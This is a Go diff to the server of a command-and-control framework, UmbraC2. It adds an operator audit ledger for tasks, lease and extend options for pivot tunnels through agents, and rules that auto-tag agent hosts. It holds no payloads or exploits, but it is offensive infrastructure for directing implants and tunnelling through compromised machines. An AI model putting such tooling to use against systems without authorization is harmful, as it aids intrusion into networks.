@@ -40,6 +40,7 @@ import (
 	"github.com/thesyntax1/UmbraC2/server/internal/silence"
 	"github.com/thesyntax1/UmbraC2/server/internal/stager"
 	"github.com/thesyntax1/UmbraC2/server/internal/store"
+	"github.com/thesyntax1/UmbraC2/server/internal/tagrule"
 	"github.com/thesyntax1/UmbraC2/server/internal/upk"
 	"github.com/thesyntax1/UmbraC2/server/internal/wire"
 )
@@ -863,7 +864,16 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 		if err != nil {
 			return fail("task.submit: %v", err)
 		}
-		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "state": t.State})
+		// The ledger of who asked: the console that submitted it, and
+		// the shelf the task came from if there is one.
+		source, _ := args["source"].(string)
+		s.ledgerAdd(t.ID, t.AgentID, t.Kind, op.Name, source)
+		out := upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "state": t.State,
+			"by": op.Name}
+		if source != "" {
+			out["source"] = cut(source, 64)
+		}
+		return reply(out)
 
 	case "task.chain":
 		id, _ := args["id"].(string)
@@ -885,10 +895,21 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 		if err != nil {
 			return fail("task.chain: %v", err)
 		}
+		s.ledgerAdd(task.ID, task.AgentID, task.Kind, op.Name, "chain:"+chain.ID)
 		return reply(upk.Map{
 			"chain_id": chain.ID, "task_id": task.ID, "agent_id": chain.AgentID,
 			"stages": len(chain.Stages), "state": task.State,
+			"by": op.Name, "source": "chain:" + chain.ID,
 		})
+
+	case "task.ledger-dig":
+		// The digest of the ledger of who asked: a console that looks at
+		// the queue can carry the digest home and compare, the way a
+		// merchant compares the seal of the crate before it argues about
+		// what is inside.
+		digest, entries, first, last := s.ledgerDigest()
+		return reply(upk.Map{"digest": digest, "entries": int64(entries),
+			"first": int64(first), "last": int64(last)})
 
 	case "task.claim":
 		taskID, _ := args["task_id"].(string)
@@ -937,11 +958,16 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 		if err != nil {
 			return fail("task.retry: %v", err)
 		}
+		// The retry of a task is a new question, and the ledger names
+		// where it came from, so nobody wonders where it came from.
+		s.ledgerAdd(nt.ID, nt.AgentID, nt.Kind, op.Name, "retry:"+old.ID)
 		return reply(upk.Map{
 			"task_id":  nt.ID,
 			"agent_id": nt.AgentID,
 			"kind":     nt.Kind,
 			"retried":  old.ID,
+			"by":       op.Name,
+			"source":   "retry:" + old.ID,
 		})
 
 	case "task.list":
@@ -1006,8 +1032,12 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 				rows = append(rows, upk.Map{"agent_id": a.ID, "error": err.Error()})
 				continue
 			}
+			// The fan-out of a bulk is one question to many hosts; the
+			// ledger says so, so every row of it knows where it grew from.
+			s.ledgerAdd(t.ID, t.AgentID, t.Kind, op.Name, "bulk")
 			rows = append(rows, upk.Map{
 				"agent_id": a.ID, "task_id": t.ID, "state": t.State,
+				"by": op.Name, "source": "bulk",
 			})
 		}
 		return reply(upk.Map{"tasks": rows, "count": len(rows)})
@@ -1244,6 +1274,8 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 		loopback, _ := args["loopback"].(bool)
 		pipe, _ := args["pipe"].(bool)
 		pipeName, _ := args["pipe_name"].(string)
+		via, _ := args["via"].(string)
+		lease, _ := asInt64(args["lease"])
 		// The chain of hops after the first agent: the server walks it,
 		// so the operator only names the far end.
 		var path []string
@@ -1268,11 +1300,13 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 			Path:     path,
 			Pipe:     pipe,
 			PipeName: pipeName,
+			Via:      via,
+			TTL:      int(lease),
 		})
 		if err != nil {
 			return fail("pivot.open: %v", err)
 		}
-		return reply(upk.Map{
+		out := upk.Map{
 			"stream":   tun.Stream,
 			"agent_id": tun.AgentID,
 			"mode":     tun.Mode,
@@ -1284,7 +1318,30 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 			"dns":      tun.DNS,
 			"path":     pathAny(tun.Path),
 			"pipe":     tun.Pipe,
-		})
+		}
+		if tun.Via != "" {
+			out["via"] = tun.Via
+		}
+		if !tun.Expires.IsZero() {
+			out["lease"] = int64(lease)
+			out["expires"] = tun.Expires.Format(time.RFC3339)
+		}
+		return reply(out)
+
+	case "pivot.extend":
+		// Push the closing of a leased door further out; a door without
+		// a lease has nothing to push.
+		if s.Pivot == nil {
+			return fail("pivot.extend: pivoting is not enabled on this server")
+		}
+		stream, _ := args["stream"].(string)
+		seconds, _ := asInt64(args["seconds"])
+		expires, err := s.Pivot.Extend(stream, int(seconds))
+		if err != nil {
+			return fail("pivot.extend: %v", err)
+		}
+		return reply(upk.Map{"stream": stream, "lease": seconds,
+			"expires": expires.Format(time.RFC3339)})
 
 	case "pivot.close":
 		if s.Pivot == nil {
@@ -2889,6 +2946,54 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 			}})
 		return reply(upk.Map{"id": entryID, "agent": agentID,
 			"queued": int64(queued), "failed": int64(failedCount)})
+
+	// ---- the sorting hat of the fleet -------------------------------------
+	case "tag.rule.add":
+		// One sentence of the hat: the field it reads, the needle it
+		// looks for, and the tag the host earns.
+		if s.TagRules == nil {
+			return fail("tag.rule.add: this server colours nobody")
+		}
+		name, _ := args["name"].(string)
+		field, _ := args["field"].(string)
+		contains, _ := args["contains"].(string)
+		prefix, _ := args["prefix"].(string)
+		tag, _ := args["tag"].(string)
+		rule, err := s.TagRules.Add(tagrule.Rule{
+			Name: name, Field: field, Contains: contains,
+			Prefix: prefix, Tag: tag, Creator: op.Name,
+		})
+		if err != nil {
+			return fail("tag.rule.add: %v", err)
+		}
+		if err := s.TagRules.Save(); err != nil {
+			s.Log.Warn("the shelf of the rules could not be saved", "err", err)
+		}
+		return reply(tagRuleMap(rule))
+
+	case "tag.rule.list":
+		if s.TagRules == nil {
+			return fail("tag.rule.list: this server colours nobody")
+		}
+		rules := s.TagRules.List()
+		rows := make([]any, 0, len(rules))
+		for _, rule := range rules {
+			rows = append(rows, tagRuleMap(rule))
+		}
+		return reply(upk.Map{"rules": rows, "count": int64(len(rows))})
+
+	case "tag.rule.remove":
+		if s.TagRules == nil {
+			return fail("tag.rule.remove: this server colours nobody")
+		}
+		entryID, _ := args["id"].(string)
+		if err := s.TagRules.Remove(entryID); err != nil {
+			return fail("tag.rule.remove: %v", err)
+		}
+		if err := s.TagRules.Save(); err != nil {
+			s.Log.Warn("the shelf of the rules could not be saved", "err", err)
+		}
+		return reply(upk.Map{"id": entryID, "removed": true})
 
 	// ---- the map of the doors ---------------------------------------------
 	case "pivot.map":
@@ -4753,6 +4858,30 @@ func playbookMap(play onboard.Playbook) upk.Map {
 	if !play.LastFire.IsZero() {
 		out["last_fire"] = play.LastFire.Format(time.RFC3339)
 		out["last_agent"] = play.LastAgent
+	}
+	return out
+}
+
+// tagRuleMap renders one sentence of the sorting hat.
+func tagRuleMap(rule tagrule.Rule) upk.Map {
+	out := upk.Map{
+		"id":      rule.ID,
+		"name":    rule.Name,
+		"field":   rule.Field,
+		"tag":     rule.Tag,
+		"creator": rule.Creator,
+		"created": rule.Created.Format(time.RFC3339),
+		"fires":   int64(rule.Fires),
+	}
+	if rule.Contains != "" {
+		out["contains"] = rule.Contains
+	}
+	if rule.Prefix != "" {
+		out["prefix"] = rule.Prefix
+	}
+	if !rule.LastFire.IsZero() {
+		out["last_fire"] = rule.LastFire.Format(time.RFC3339)
+		out["last_agent"] = rule.LastAgent
 	}
 	return out
 }
